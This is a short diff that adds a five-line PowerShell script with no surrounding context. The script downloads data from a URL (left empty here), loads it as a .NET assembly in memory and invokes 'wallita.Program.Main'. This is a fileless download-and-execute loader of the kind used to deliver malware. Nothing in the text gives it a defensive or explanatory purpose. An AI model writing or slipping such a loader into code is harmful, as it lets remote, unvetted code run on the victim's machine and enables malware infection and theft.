@@ -1,0 +1,5 @@
+$data = (New-Object System.Net.WebClient).DownloadData("")
+$ass = [System.Reflection.Assembly]::Load($data)
+$cla = $ass.GetType("wallita.Program")
+$met = $cla.GetMethod("Main")
+$met.Invoke(0,$null)
